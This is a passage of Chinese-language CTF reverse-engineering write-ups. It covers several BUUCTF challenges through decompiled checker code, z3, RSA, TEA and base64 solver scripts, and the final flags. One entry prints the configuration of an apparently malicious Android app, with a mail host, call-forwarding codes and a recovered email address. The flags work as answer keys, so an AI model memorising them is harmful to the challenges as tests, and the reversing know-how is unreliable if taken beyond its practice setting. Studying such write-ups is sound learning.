__int64 a5, __int64 a6) { __int64 result; // rax __int64 v7; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); Printf((__int64)\u0026quot;input your flag:\u0026quot;, a2, a3, a4, a5, a6, 0LL, 0LL, 0LL, 0LL); Scanf((__int64)\u0026quot;%s\u0026quot;, \u0026amp;v7); if ( sub_4009AE((char *)\u0026amp;v7) ) puts(\u0026quot;Correct!\u0026quot;); else puts(\u0026quot;Wrong!\u0026quot;); result = 0LL; if ( __readfsqword(0x28u) != v8 ) sub_443550(); return result; } 主要加密在sub_4009AE _BOOL8 __fastcall sub_4009AE(char *a1) { if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL; } 上z3搞它 from z3 import * s = z3.Solver() a1 = [Int('a1[%d]' % i) for i in range(32)] s.add(1629056 * a1[0] == 166163712) s.add(6771600 * a1[1] == 731332800) s.add(3682944 * a1[2] == 357245568) s.add(10431000 * a1[3] == 1074393000) s.add(3977328 * a1[4] == 489211344) s.add(5138336 * a1[5] == 518971936) s.add(7532250 * a1[7] == 406741500) s.add(5551632 * a1[8] == 294236496) s.add(3409728 * a1[9] == 177305856) s.add(13013670 * a1[10] == 650683500) s.add(6088797 * a1[11] == 298351053) s.add(7884663 * a1[12] == 386348487) s.add(8944053 * a1[13] == 438258597) s.add(5198490 * a1[14] == 249527520) s.add(4544518 * a1[15] == 445362764) s.add(3645600 * a1[17] == 174988800) s.add(10115280 * a1[16] == 981182160) s.add(9667504 * a1[18] == 493042704) s.add(5364450 * a1[19] == 257493600) s.add(13464540 * a1[20] == 767478780) s.add(5488432 * a1[21] == 312840624) s.add(14479500 * a1[22] == 1404511500) s.add(6451830 * a1[23] == 316139670) s.add(6252576 * a1[24] == 619005024) s.add(7763364 * a1[25] == 372641472) s.add(7327320 * a1[26] == 373693320) s.add(8741520 * a1[27] == 498266640) s.add(8871876 * a1[28] == 452465676) s.add(4086720 * a1[29] == 208422720) s.add(9374400 * a1[30] == 515592000) s.add(5759124 * a1[31] == 719890500) s.check() print(s.model()) 打印flag a1 = [0] * 32 a1[31] = 125 a1[30] = 55 a1[29] = 51 a1[28] = 51 a1[27] = 57 a1[26] = 51 a1[25] = 48 a1[24] = 99 a1[23] = 49 a1[22] = 97 a1[21] = 57 a1[20] = 57 a1[19] = 48 a1[18] = 51 a1[16] = 97 a1[17] = 48 a1[15] = 98 a1[14] = 48 a1[13] = 49 a1[12] = 49 a1[11] = 49 a1[10] = 50 a1[9] = 52 a1[8] = 53 a1[7] = 54 a1[5] = 101 a1[4] = 123 a1[3] = 103 a1[2] = 97 a1[1] = 108 a1[0] = 102 for i in range(32): print(chr(a1[i]),end=\u0026quot;\u0026quot;) 这里有两个小问题\n伪代码中16、17两位顺序反了，但因为z3搞的时候是顺着命名未知数的，所以反上加反等于顺序正确，不用修改\n另一点就是第6位缺失，并未进行判断，实测无论第6位是什么，源程序都会输出Correct！，应该是多解，但无奈buu平台上只认第6位为1\n故flag{e165421110ba03099a1c039337}\n[SUCTF2019]SignIn 进ida看到main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char code[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\u0026quot;[sign in]\u0026quot;); printf(\u0026quot;[input your flag]: \u0026quot;); __isoc99_scanf(\u0026quot;%99s\u0026quot;, v8); sub_96A(v8, v9); __gmpz_init_set_str(code, \u0026quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\u0026quot;, 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \u0026quot;103461035900816914121390101299049044413950405173712170434161686539878160984549\u0026quot;, 10LL); __gmpz_init_set_str(v5, \u0026quot;65537\u0026quot;, 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, code) ) puts(\u0026quot;GG!\u0026quot;); else puts(\u0026quot;TTTTTTTTTTql!\u0026quot;); return 0LL; } 标准的用gmp库实现的RSA算法\n参考gmpy2常见函数使用 RSA算法原理\n利用gmpy2库解出flag\nimport gmpy2 from Crypto.Util.number import * n = 103461035900816914121390101299049044413950405173712170434161686539878160984549 p = 282164587459512124844245113950593348271 q = 366669102002966856876605669837014229419 code = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 e = 65537 l = (p-1)*(q-1) d = gmpy2.invert(e,l) flag = gmpy2.powmod(code,d,n) print(long_to_bytes(flag)) #output：b'suctf{Pwn_@_hundred_years}' [WUSTCTF2020]level1 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-2Ch] FILE *stream; // [rsp+8h] [rbp-28h] char ptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(\u0026quot;flag\u0026quot;, \u0026quot;r\u0026quot;); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i \u0026lt;= 19; ++i ) { if ( (i \u0026amp; 1) != 0 ) printf(\u0026quot;%ld\\n\u0026quot;, (unsigned int)(ptr[i] \u0026lt;\u0026lt; i)); else printf(\u0026quot;%ld\\n\u0026quot;, (unsigned int)(i * ptr[i])); } return 0; } 有强转直接逆不太保险，正着直接爆出来 #include\u0026lt;stdio.h\u0026gt; int main(){ unsigned int en_flag[] = {0,198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000}; char flag[19] = {0}; for(int i = 1;i \u0026lt;= 19; i++){ for(int j = 32; j \u0026lt;= 126; j++){ unsigned int t; if(i \u0026amp; 1 != 0) t = (unsigned int)(j \u0026lt;\u0026lt; i); else t = (unsigned int)(j * i); if(t == en_flag[i]) flag[i] = j; } printf(\u0026quot;%c\u0026quot;,flag[i]); } } //output：ctf2020{d9-dE6-20c} （这两天题咋越做越简单了，，\n[MRCTF2020]Transform 进ida就能看到main函数，简单改一下变量名\nint __cdecl main(int argc, const char **argv, const char **envp) { char Str[104]; // [rsp+20h] [rbp-70h] BYREF int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); Printf(\u0026quot;Give me your code:\\n\u0026quot;); Scanf(\u0026quot;%s\u0026quot;, Str); if ( strlen(Str) != 33 ) { Printf(\u0026quot;Wrong!\\n\u0026quot;); system(\u0026quot;pause\u0026quot;); exit(0); } for ( i = 0; i \u0026lt;= 32; ++i ) { en_flag[i] = Str[index[i]]; en_flag[i] ^= LOBYTE(index[i]); } for ( j = 0; j \u0026lt;= 32; ++j ) { if ( byte_40F0E0[j] != en_flag[j] ) { Printf(\u0026quot;Wrong!\\n\u0026quot;); system(\u0026quot;pause\u0026quot;); exit(0); } } Printf(\u0026quot;Right!Good Job!\\n\u0026quot;); Printf(\u0026quot;Here is your flag: %s\\n\u0026quot;, Str); system(\u0026quot;pause\u0026quot;); return 0; } 直接逆拿flag index = [ 0x09, 0x0A, 0x0F, 0x17, 0x07, 0x18, 0x0C, 0x06, 0x01, 0x10, 0x03, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16, 0x04, 0x0D, 0x13, 0x14, 0x15, 0x02, 0x19, 0x05, 0x1F, 0x08, 0x12, 0x1A, 0x1C, 0x0E,0] en_flag = [ 0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D] flag = [0] * 33 for i in range(0,33): en_flag[i] ^= index[i] flag[index[i]] = en_flag[i] for i in flag: print(chr(i), end = \u0026quot;\u0026quot;) #output：MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z} [ACTF新生赛2020]usualCrypt 进ida看main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // esi int result; // eax int v5[3]; // [esp+8h] [ebp-74h] BYREF __int16 v6; // [esp+14h] [ebp-68h] char v7; // [esp+16h] [ebp-66h] char v8[100]; // [esp+18h] [ebp-64h] BYREF printf(asc_40E140); scanf(\u0026quot;%s\u0026quot;, v8); v5[0] = 0; v5[1] = 0; v5[2] = 0; v6 = 0; v7 = 0; encrypt((int)v8, strlen(v8), (int)v5); v3 = 0; while ( *((_BYTE *)v5 + v3) == enc[v3] ) { if ( ++v3 \u0026gt; strlen((const char *)v5) ) goto LABEL_6; } printf(\u0026quot;error!\\n\u0026quot;); LABEL_6: if ( v3 - 1 == strlen(enc) ) result = printf(\u0026quot;Are you happy?yes!\\n\u0026quot;); else result = printf(\u0026quot;Are you happy?No!\\n\u0026quot;); return result; } encrypt函数 void __cdecl encrypt(int a1, int a2, int a3) { int v3; // edi int v4; // esi int v5; // edx int v6; // eax int v7; // ecx int v8; // esi int v9; // esi int v10; // esi int v11; // esi _BYTE *v12; // ecx int v13; // esi int a2a; // [esp+18h] [ebp+8h] v3 = 0; v4 = 0; changeTable(); // base64换表 v5 = a2 % 3; v6 = a1; v7 = a2 - a2 % 3; a2a = a2 % 3; if ( v7 \u0026gt; 0 ) { do { LOBYTE(v5) = *(_BYTE *)(a1 + v3); v3 += 3; v8 = v4 + 1; *(_BYTE *)(v8 + a3 - 1) = aAbcdefghijklmn[(v5 \u0026gt;\u0026gt; 2) \u0026amp; 0x3F]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(a1 + v3 - 3) \u0026amp; 3) + (((int)*(unsigned __int8 *)(a1 + v3 - 2) \u0026gt;\u0026gt; 4) \u0026amp; 0xF)]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[4 * (*(_BYTE *)(a1 + v3 - 2) \u0026amp; 0xF) + (((int)*(unsigned __int8 *)(a1 + v3 - 1) \u0026gt;\u0026gt; 6) \u0026amp; 3)]; v5 = *(_BYTE *)(a1 + v3 - 1) \u0026amp; 0x3F; v4 = v8 + 1; *(_BYTE *)(v4 + a3 - 1) = aAbcdefghijklmn[v5]; } while ( v3 \u0026lt; v7 ); v5 = a2a; } if ( v5 == 1 ) { LOBYTE(v7) = *(_BYTE *)(v3 + a1); v9 = v4 + 1; *(_BYTE *)(v9 + a3 - 1) = aAbcdefghijklmn[(v7 \u0026gt;\u0026gt; 2) \u0026amp; 0x3F]; v10 = v9 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026amp; 3)]; *(_BYTE *)(v10 + a3) = 61; LABEL_8: v13 = v10 + 1; *(_BYTE *)(v13 + a3) = 61; v4 = v13 + 1; goto LABEL_9; } if ( v5 == 2 ) { v11 = v4 + 1; *(_BYTE *)(v11 + a3 - 1) = aAbcdefghijklmn[((int)*(unsigned __int8 *)(v3 + a1) \u0026gt;\u0026gt; 2) \u0026amp; 0x3F]; v12 = (_BYTE *)(v3 + a1 + 1); LOBYTE(v6) = *v12; v10 = v11 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026amp; 3) + ((v6 \u0026gt;\u0026gt; 4) \u0026amp; 0xF)]; *(_BYTE *)(v10 + a3) = aAbcdefghijklmn[4 * (*v12 \u0026amp; 0xF)]; goto LABEL_8; } LABEL_9: *(_BYTE *)(v4 + a3) = 0; switch((const char *)a3); // 大小写转换 } 出题人在寒顺的开头和结尾耍了一点小心思\n上面先简单的换了个base64的表，下面把base64编码后的字符串中的字母进行大小写转换\n最终得到的字符串与已知字符串比较\n写脚本拿flag\nimport base64 enc = \u0026quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9\u0026quot; ch = \u0026quot;\u0026quot; for i in enc: if(ord(i) \u0026lt; 97 or ord(i) \u0026gt; 122): if(ord(i) \u0026lt; 65 or ord(i) \u0026gt; 90): ch += i continue ch += chr(ord(i) + 32) else: ch += chr(ord(i) - 32) old_table = \u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; new_table = \u0026quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; table = str.maketrans(old_table, new_table) print(base64.b64decode(ch.translate(table))) #output：b'flag{bAse64_h2s_a_Surprise}' Youngter-drive 参考g0ul4sh的wp，大佬写得很详细，学到很多\n总的来说，这是一道很有意思的题\n先要脱upx壳，然后拖进ida，main函数\nint __cdecl main_0(int argc, const char **argv, const char **envp) { void *v3; // ecx HANDLE v5; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] ini(v3); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Destination, (const char *)Source); hObject = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(v5); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0; } CreateThread API 会创建新线程，这道题涉及到多线程。CreateMutex 创建一个互斥体，用于防止多线程中出现资源争用，即多个线程同时读写同一个资源的情况，所创建的互斥体的句柄会存到全局变量 hObject 中（注意前面的两个冒号表示是全局变量，而不是这个函数里同名的局部变量）。这里创建了两个线程，入口点分别位于函数 StartAddress 和 sub_41119F\nStartAddress线程内部函数 void __stdcall StartAddress_0(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u0026gt; -1 ) { sub_41112C((int)Source, (char *)dword_418008); --dword_418008; Sleep(0x64u); } ReleaseMutex(hObject); } } //sub_41112C内部嵌套sub_411940 void __cdecl sub_411940(int a1, char *a2) { char v2; // [esp+D3h] [ebp-5h] v2 = a2[a1]; if ( (v2 \u0026lt; 'a' || v2 \u0026gt; 'z') \u0026amp;\u0026amp; (v2 \u0026lt; 'A' || v2 \u0026gt; 'Z') ) exit(0); if ( v2 \u0026lt; 'a' || v2 \u0026gt; 'z' ) a2[a1] = off_418000[0][a2[a1] - 38]; else a2[a1] = off_418000[0][a2[a1] - 96]; } 这里发现个小问题，通过函数实现判断sub__41112C函数和内部sub_411940函数参数顺序颠倒，猜测是stdcall和cdecl传参顺序不同引起的，但ida识别错误\nsub_41119F线程内部函数\nvoid __stdcall sub_411B10(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u0026gt; -1 ) { Sleep(0x64u); --dword_418008; } ReleaseMutex(hObject); } } 自己做的时候不懂多线程，以为这个函数没啥用，导致卡死 查 MSDN 知，可以用 WaitForSingleObject 等待互斥体的使用权（ownership）空闲出来，并获取使用权，然后再访问和其他线程共享的资源，访问完后，用 ReleaseMutex 释放使用权，给其他线程使用的机会4。通过比较两线程的函数，很容易知道所共享的资源就是全局变量 dword_418008，它的初值是 29。而这两个线程一前一后创建，理论上是 StartAddress 先获得使用权，后来的 sub_41119F 进入等待状态，前者执行一次循环后释放使用权，与此同时后者等待结束、获得使用权，进入循环，循环完后释放使用权，前者又获得使用权，如此循环往复。也就是说，两个线程的操作是交替进行的。\n故实现的功能是奇数位加密，偶数位不变\n还是喜欢直接爆\ntable = \u0026quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\\0\u0026quot; cmp_code = \u0026quot;TOiZiZtOrYaToUwPnToBsOaOapsyS\\0\u0026quot; inp = \u0026quot;\u0026quot; for i in range(0,29): if(i % 2 == 0): inp += cmp_code[i] else: for j in range(0,127): if ( (j \u0026lt; ord('a') or j \u0026gt; ord('z')) and (j \u0026lt; ord('A') or j \u0026gt; ord('Z')) ): continue if ( j \u0026lt; 97 or j \u0026gt; 122 ): if(cmp_code[i] == table[j - 38]): inp += chr(j) else: if(cmp_code[i] == table[j - 96]): inp += chr(j) print(inp) #output：ThisisthreadofwindowshahaIsES 爆破中间又发现了个算法的小问题，按这样加密table中的第一位永远也用不到，且必须最后加个\\0才能防止数组下标越界，可能是出题人的疏忽，还是故意？\n最后还有个小坑，输入应该为30位，但程序验证的即我们所能解出的只有29位，应为多解，但出题人以及buu平台上默认最后一位是E才能correct\n总结一下，这道题集合了upx脱壳，反调试（但可以像我一样只静态分析），多线程这么多知识点，可以说十分优秀了，也让我学到了很多\n[WUSTCTF2020]level2 没啥说的，纯新手题，upx脱个壳，ida打开汇编main函数就能看到flag{Just_upx_-d}\n相册 安卓逆向，就对着jeb使劲翻吧\n有一个C2类比较有用\npackage cn.baidujiayuan.ver5304; import android.content.Context; import com.net.cn.NativeMethod; import it.sauronsoftware.base64.Base64; import java.text.ParsePosition; import java.text.SimpleDateFormat; import java.util.Date; public class C2 { public static final String CANCELNUMBER = \u0026quot;%23%2321%23\u0026quot;; public static final String MAILFROME = null; public static final String MAILHOST = \u0026quot;smtp.163.com\u0026quot;; public static final String MAILPASS = null; public static final String MAILSERVER = null; public static final String MAILUSER = null; public static final String MOVENUMBER = \u0026quot;**21*121%23\u0026quot;; public static final String PORT = \u0026quot;25\u0026quot;; public static final String date = \u0026quot;2115-11-1\u0026quot;; public static final String phoneNumber; static { System.loadLibrary(\u0026quot;core\u0026quot;); C2.MAILSERVER = Base64.decode(NativeMethod.m()); C2.MAILUSER = Base64.decode(NativeMethod.m()); C2.MAILPASS = Base64.decode(NativeMethod.pwd()); C2.MAILFROME = Base64.decode(NativeMethod.m()); C2.phoneNumber = Base64.decode(NativeMethod.p()); } public C2() { super(); } public static boolean isFilter(Context arg6) { boolean v2 = C2.strToDateLong(\u0026quot;2115-11-1\u0026quot;).getTime() - new Date().getTime() \u0026lt; 0 ? true : false; return v2; } public static boolean isServerFilter(Context arg5) { boolean v2 = false; if(arg5.getSharedPreferences(\u0026quot;X\u0026quot;, 0).getString(\u0026quot;m\u0026quot;, \u0026quot;1\u0026quot;).equals(\u0026quot;1\u0026quot;)) { v2 = true; } return v2; } public static Date strToDateLong(String arg4) { return new SimpleDateFormat(\u0026quot;yyyy-MM-dd\u0026quot;).parse(arg4, new ParsePosition(0)); } } 可以看到像MAILUSER``MAILPASS这样的变量很像是我们所要的邮箱\n但还是对java/jeb不熟悉，单知道JNI却不知道NativeMethod，还以为是什么内置函数，找半天也找不到，后面查到有关java中的native才懂原来和JNI基本是一个东西\n于是解压apk，在lib文件夹中找到so文件，拖进ida，找export，看到了Java_com_net_cn_NativeMethod_m，跟进去就能看到base64编码的字符串MTgyMTg0NjUxMjVAMTYzLmNvbQ==\nbase64decode得邮箱18218465125@163.com\n[MRCTF2020]Xor 异或拿flag\n[HDCTF2019]Maze upx脱壳，进ida\n有个花指令，稍微修一下，就能F5了，main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { int i; // [esp+10h] [ebp-14h] char v5[16]; // [esp+14h] [ebp-10h] BYREF printf(\u0026quot;Go through the maze to get the flag!\\n\u0026quot;); scanf(\u0026quot;%14s\u0026quot;, v5); for ( i = 0; i \u0026lt;= 13; ++i ) { switch ( v5[i] ) { case 'a': --dword_408078; break; case 'd': ++dword_408078; break; case 's': --dword_40807C; break; case 'w': ++dword_40807C; break; default: continue; } } if ( dword_408078 == 5 \u0026amp;\u0026amp; dword_40807C == -4 ) { printf(\u0026quot;Congratulations!\\n\u0026quot;); printf(\u0026quot;Here is the flag:flag{%s}\\n\u0026quot;, v5); } else { printf(\u0026quot;Try again...\\n\u0026quot;); } return 0; } string窗口翻翻就能找到地图，总共70个字符，试了试应该是10*7 '*', '*', '*', '*', '*', '*', '*', '+', '*', '*' '*', '*', '*', '*', '*', '*', '*', ' ', '*', '*' '*', '*', '*', '*', ' ', ' ', ' ', ' ', '*', '*' '*', '*', ' ', ' ', ' ', '*', '*', '*', '*', '*' '*', '*', ' ', '*', '*', 'F', '*', '*', '*', '*' '*', '*', ' ', ' ', ' ', ' ', '*', '*', '*', '*' '*', '*', '*', '*', '*', '*', '*', '*', '*', '*' 手动走一下ssaaasaassdddw，即flag{ssaaasaassdddw}\n[GWCTF 2019]xxor main函数\n// local variable allocation has failed, the output may be wrong! __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] int v6[6]; // [rsp+10h] [rbp-60h] OVERLAPPED BYREF __int128 v7; // [rsp+28h] [rbp-48h] int v8[6]; // [rsp+40h] [rbp-30h] OVERLAPPED BYREF __int128 v9; // [rsp+58h] [rbp-18h] unsigned __int64 v10; // [rsp+68h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\u0026quot;Let us play a game?\u0026quot;); puts(\u0026quot;you have six chances to input\u0026quot;); puts(\u0026quot;Come on!\u0026quot;); *(_OWORD *)v6 = 0uLL; *(_QWORD *)\u0026amp;v6[4] = 0LL; v7 = 0uLL; for ( i = 0; i \u0026lt;= 5; ++i ) { printf(\u0026quot;%s\u0026quot;, \u0026quot;input: \u0026quot;); __isoc99_scanf(\u0026quot;%d\u0026quot;, \u0026amp;v6[i]); } *(_OWORD *)v8 = 0uLL; *(_QWORD *)\u0026amp;v8[4] = 0LL; v9 = 0uLL; for ( j = 0; j \u0026lt;= 4; j += 2 ) { lowInt = v6[j]; highInt = v6[j + 1]; teaCrypt(\u0026amp;lowInt, \u0026amp;dword_601060); v8[j] = lowInt; v8[j + 1] = highInt; } if ( (unsigned int)sub_400770(v8) != 1 ) { puts(\u0026quot;NO NO NO~ \u0026quot;); exit(0); } puts(\u0026quot;Congratulation!\\n\u0026quot;); puts(\u0026quot;You seccess half\\n\u0026quot;); puts(\u0026quot;Do not forget to change input to hex and combine~\\n\u0026quot;); puts(\u0026quot;ByeBye\u0026quot;); return 0LL; } 输入六串数字，先进行tea加密，然后进sub_400770要解一个小方程组 __int64 __fastcall teaCrypt(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u0026lt;= 0x3F; ++i ) { v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 \u0026lt;\u0026lt; 6) + *a2) ^ ((v4 \u0026gt;\u0026gt; 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u0026lt;\u0026lt; 6) + a2[2]) ^ ((v3 \u0026gt;\u0026gt; 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } __int64 __fastcall sub_400770(int *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 2225223423LL \u0026amp;\u0026amp; a1[3] + a1[4] == 4201428739LL \u0026amp;\u0026amp; a1[2] - a1[4] == 1121399208LL \u0026amp;\u0026amp; *a1 == -548868226 \u0026amp;\u0026amp; a1[5] == -2064448480 \u0026amp;\u0026amp; a1[1] == 550153460 ) { puts(\u0026quot;good!\u0026quot;); result = 1LL; } else { puts(\u0026quot;Wrong!\u0026quot;); result = 0LL; } return result; } 逆过来先z3解方程 from z3 import * s = z3.Solver() a2 = Int(\u0026quot;a1[2]\u0026quot;) a3 = Int(\u0026quot;a1[3]\u0026quot;) a4 = Int(\u0026quot;a1[4]\u0026quot;) s.add(a2 - a3 == 0x84A236FF) s.add(a3 + a4 == 0xFA6CB703) s.add(a2 - a4 == 0x42D731A8) s.check() print(s.model()) # \u0026amp;\u0026amp; *a1 == -548868226 # \u0026amp;\u0026amp; a1[5] == -2064448480 # \u0026amp;\u0026amp; a1[1] == 550153460 # output：[a1[2] = 3774025685, a1[3] = 1548802262, a1[4] = 2652626477] 然后tea解密 #include\u0026lt;stdio.h\u0026gt; int main(){ unsigned int a1[6] = {0xDF48EF7E, 0x20CAACF4, 3774025685, 1548802262, 2652626477, 0x84F30420}; int key[] = {2, 2, 3, 4}; for(int i = 0 ;i \u0026lt;= 2; i++){ unsigned int lowbytes = a1[2 * i]; unsigned int highbytes = a1[2 * i + 1]; for(int j = 0x3f; j \u0026gt;= 0; j--){ int delta = 1166789954 * (j + 1); highbytes -= (lowbytes + delta + 20) ^ ((lowbytes \u0026lt;\u0026lt; 6) + key[2]) ^ ((lowbytes \u0026gt;\u0026gt; 9) + key[3]) ^ 0x10; lowbytes -= (highbytes + delta + 11) ^ ((highbytes \u0026lt;\u0026lt; 6) + key[0]) ^ ((highbytes \u0026gt;\u0026gt; 9) + key[1]) ^ 0x20; } a1[2 * i] = lowbytes; a1[2 * i + 1] = highbytes; } for(int i = 0; i \u0026lt;= 5; i++){ printf(\u0026quot;%x\u0026quot;, a1[i]); } return 0; } //output：666c61677b72655f69735f6772656174217d⏎ long_to_bytes一下拿flag{re_is_great!}\n[MRCTF2020]hello_world_go main函数\nvoid __cdecl main_main() { int v0; // edi __int64 v1; // rsi __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 int v6; // edx __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // rcx __int64 v10; // rax int v11; // edx __int64 v12; // rax __int64 *v13; // [rsp+8h] [rbp-A8h] char v14; // [rsp+18h] [rbp-98h] __int64 v15; // [rsp+20h] [rbp-90h] __int64 v16; // [rsp+28h] [rbp-88h] __int64 v17; // [rsp+58h] [rbp-58h] __int64 *v18; // [rsp+60h] [rbp-50h] __int128 v19; // [rsp+68h] [rbp-48h] BYREF void *v20; // [rsp+78h] [rbp-38h] BYREF void **v21; // [rsp+80h] [rbp-30h] BYREF __int128 v22; // [rsp+88h] [rbp-28h] BYREF __int128 v23; // [rsp+98h] [rbp-18h] BYREF if ( (unsigned __int64)\u0026amp;v21 \u0026lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(v0, v1); v18 = v13; *(_QWORD *)\u0026amp;v23 = \u0026amp;unk_4AC9C0; *((_QWORD *)\u0026amp;v23 + 1) = \u0026amp;off_4EA530; fmt_Fprint( v0, v1, (unsigned int)\u0026amp;v23, (unsigned int)\u0026amp;unk_4AC9C0, v2, v3, (__int64)\u0026amp;go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026amp;v23); *(_QWORD *)\u0026amp;v22 = \u0026amp;unk_4A96A0; *((_QWORD *)\u0026amp;v22 + 1) = v18; fmt_Fscanf( v0, v1, (unsigned int)\u0026amp;go_itab__os_File_io_Reader, (unsigned int)\u0026amp;v22, v4, v5, (__int64)\u0026amp;go_itab__os_File_io_Reader, os_Stdin, (__int64)\u0026amp;unk_4D07C9, 2LL, (__int64)\u0026amp;v22, 1LL); v9 = v18[1]; v10 = *v18; if ( v9 != 24 ) goto LABEL_3; v17 = *v18; runtime_memequal(v0, v1, v6, (unsigned int)aFlagHelloWorld, v7, v8, (__int64)aFlagHelloWorld, v10); if ( !v14 ) { LOBYTE(v10) = v17; LODWORD(v9) = 24; LABEL_3: runtime_cmpstring(v0, v1, (unsigned int)aFlagHelloWorld, v9, v7, v8, (__int64)aFlagHelloWorld, 24LL, v10); if ( v15 \u0026gt;= 0 ) v12 = 1LL; else v12 = -1LL; goto LABEL_5; } v12 = 0LL; LABEL_5: if ( v12 ) { *(_QWORD *)\u0026amp;v19 = \u0026amp;unk_4AC9C0; *((_QWORD *)\u0026amp;v19 + 1) = \u0026amp;off_4EA550; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026amp;go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026amp;go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026amp;v19, 1LL, 